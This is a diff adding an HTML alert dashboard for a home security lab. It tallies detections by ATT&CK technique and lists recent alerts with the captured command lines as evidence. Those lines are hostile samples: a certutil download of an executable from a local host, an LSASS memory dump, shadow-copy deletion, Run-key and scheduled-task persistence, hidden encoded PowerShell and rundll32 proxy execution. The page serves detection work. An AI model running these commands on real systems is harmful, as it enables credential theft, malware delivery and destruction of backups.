@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>home-lab-soc dashboard</title>
+<style>
+ body { font-family: -apple-system, system-ui, sans-serif; margin: 2rem;
+         background:#0f1117; color:#e6e6e6; }
+ h1 { font-size:1.4rem; }
+ .cards { display:flex; gap:1rem; flex-wrap:wrap; margin:1rem 0; }
+ .card { background:#1b1f2a; border:1px solid #2a2f3a; border-radius:8px;
+          padding:1rem 1.25rem; min-width:150px; }
+ .card .n { font-size:1.8rem; font-weight:700; }
+ table { border-collapse:collapse; width:100%; margin-top:1rem; }
+ th,td { text-align:left; padding:.4rem .6rem; border-bottom:1px solid #2a2f3a;
+          font-size:.9rem; }
+ th { color:#9aa4b2; }
+ .critical { color:#ff6b6b; } .high { color:#ffa94d; }
+ .medium { color:#ffd43b; } .low { color:#74c0fc; }
+ code { color:#b2f2bb; word-break:break-all; }
+</style>
+</head>
+<body>
+<h1>home-lab-soc &mdash; alert dashboard</h1>
+<p>Local lab telemetry only. Generated from the SQLite alert store.</p>
+<div class="cards">
+ <div class="card"><div class="n">180</div>total alerts</div>
+ <div class="card"><div class="n">9</div>ATT&amp;CK techniques</div>
+ <div class="card"><div class="n">120</div>critical/high</div>
+</div>
+<h2>Alerts by ATT&amp;CK technique</h2>
+<table><tr><th>Technique</th><th>ID</th><th>Tactic</th><th>Count</th></tr>
+<tr><td>LSASS Memory</td><td>T1003.001</td><td>Credential Access</td><td>20</td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Command and Control</td><td>20</td></tr>
+<tr><td>Brute Force</td><td>T1110</td><td>Credential Access</td><td>20</td></tr>
+<tr><td>Registry Run Keys</td><td>T1547.001</td><td>Persistence</td><td>20</td></tr>
+<tr><td>Data Encrypted for Impact</td><td>T1486</td><td>Impact</td><td>20</td></tr>
+<tr><td>PowerShell</td><td>T1059.001</td><td>Execution</td><td>20</td></tr>
+<tr><td>Windows Command Shell</td><td>T1059.003</td><td>Execution</td><td>20</td></tr>
+<tr><td>Rundll32</td><td>T1218.011</td><td>Defense Evasion</td><td>20</td></tr>
+<tr><td>Scheduled Task</td><td>T1053.005</td><td>Persistence</td><td>20</td></tr>
+</table>
+<h2>Recent alerts</h2>
+<table><tr><th>Time</th><th>Level</th><th>Rule</th><th>Technique</th><th>Evidence</th></tr>
+<tr><td>2026-01-01T09:52:09+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:48:46+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:59:09+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T10:05:34+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:58:48+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T10:04:17+00:00</td><td class='medium'>medium</td><td>Suspicious cmd.exe Obfuscation</td><td>T1059.003</td><td><code>cmd.exe /c p^o^w^e^r^s^h^e^l^l -c calc</code></td></tr>
+<tr><td>2026-01-01T09:57:38+00:00</td><td class='high'>high</td><td>Certutil Ingress Tool Transfer</td><td>T1105</td><td><code>certutil.exe -urlcache -split -f http://10.0.0.5/a.exe a.exe</code></td></tr>
+<tr><td>2026-01-01T09:56:21+00:00</td><td class='high'>high</td><td>Certutil Ingress Tool Transfer</td><td>T1105</td><td><code>certutil.exe -urlcache -split -f http://10.0.0.5/a.exe a.exe</code></td></tr>
+<tr><td>2026-01-01T10:06:51+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:47:50+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:52:16+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:53:54+00:00</td><td class='high'>high</td><td>Registry Run Key Persistence</td><td>T1547.001</td><td><code>reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe</code></td></tr>
+<tr><td>2026-01-01T10:05:13+00:00</td><td class='medium'>medium</td><td>Suspicious cmd.exe Obfuscation</td><td>T1059.003</td><td><code>cmd.exe /c p^o^w^e^r^s^h^e^l^l -c calc</code></td></tr>
+<tr><td>2026-01-01T10:07:19+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T10:02:11+00:00</td><td class='low'>low</td><td>Failed Logon (4625)</td><td>T1110</td><td><code>admin</code></td></tr>
+<tr><td>2026-01-01T09:52:51+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:58:41+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T09:51:48+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:55:39+00:00</td><td class='high'>high</td><td>Registry Run Key Persistence</td><td>T1547.001</td><td><code>reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe</code></td></tr>
+<tr><td>2026-01-01T09:48:11+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:54:15+00:00</td><td class='high'>high</td><td>Registry Run Key Persistence</td><td>T1547.001</td><td><code>reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe</code></td></tr>
+<tr><td>2026-01-01T09:53:26+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:54:22+00:00</td><td class='high'>high</td><td>Registry Run Key Persistence</td><td>T1547.001</td><td><code>reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe</code></td></tr>
+<tr><td>2026-01-01T10:03:35+00:00</td><td class='medium'>medium</td><td>Suspicious cmd.exe Obfuscation</td><td>T1059.003</td><td><code>cmd.exe /c p^o^w^e^r^s^h^e^l^l -c calc</code></td></tr>
+<tr><td>2026-01-01T09:47:29+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:52:23+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T09:59:44+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T10:06:30+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:58:13+00:00</td><td class='high'>high</td><td>Certutil Ingress Tool Transfer</td><td>T1105</td><td><code>certutil.exe -urlcache -split -f http://10.0.0.5/a.exe a.exe</code></td></tr>
+<tr><td>2026-01-01T10:06:02+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T10:07:05+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:47:43+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:52:02+00:00</td><td class='medium'>medium</td><td>Scheduled Task Creation</td><td>T1053.005</td><td><code>schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon</code></td></tr>
+<tr><td>2026-01-01T10:04:03+00:00</td><td class='medium'>medium</td><td>Suspicious cmd.exe Obfuscation</td><td>T1059.003</td><td><code>cmd.exe /c p^o^w^e^r^s^h^e^l^l -c calc</code></td></tr>
+<tr><td>2026-01-01T10:06:09+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:59:37+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T09:50:45+00:00</td><td class='critical'>critical</td><td>LSASS Memory Dump</td><td>T1003.001</td><td><code>procdump64.exe -ma lsass.exe lsass.dmp</code></td></tr>
+<tr><td>2026-01-01T10:02:18+00:00</td><td class='low'>low</td><td>Failed Logon (4625)</td><td>T1110</td><td><code>admin</code></td></tr>
+<tr><td>2026-01-01T10:05:27+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T09:55:53+00:00</td><td class='high'>high</td><td>Registry Run Key Persistence</td><td>T1547.001</td><td><code>reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe</code></td></tr>
+<tr><td>2026-01-01T09:47:22+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T09:51:13+00:00</td><td class='critical'>critical</td><td>LSASS Memory Dump</td><td>T1003.001</td><td><code>procdump64.exe -ma lsass.exe lsass.dmp</code></td></tr>
+<tr><td>2026-01-01T09:58:06+00:00</td><td class='high'>high</td><td>Certutil Ingress Tool Transfer</td><td>T1105</td><td><code>certutil.exe -urlcache -split -f http://10.0.0.5/a.exe a.exe</code></td></tr>
+<tr><td>2026-01-01T10:01:08+00:00</td><td class='low'>low</td><td>Failed Logon (4625)</td><td>T1110</td><td><code>admin</code></td></tr>
+<tr><td>2026-01-01T09:46:47+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+<tr><td>2026-01-01T10:07:12+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T10:00:05+00:00</td><td class='critical'>critical</td><td>Volume Shadow Copy Deletion</td><td>T1486</td><td><code>vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td>2026-01-01T10:05:55+00:00</td><td class='high'>high</td><td>Rundll32 Proxy Execution</td><td>T1218.011</td><td><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;code</code></td></tr>
+<tr><td>2026-01-01T10:00:47+00:00</td><td class='low'>low</td><td>Failed Logon (4625)</td><td>T1110</td><td><code>admin</code></td></tr>
+<tr><td>2026-01-01T09:48:39+00:00</td><td class='high'>high</td><td>PowerShell Encoded Command</td><td>T1059.001</td><td><code>powershell.exe -nop -w hidden -enc SQBFAFgA</code></td></tr>
+</table>
+</body></html>
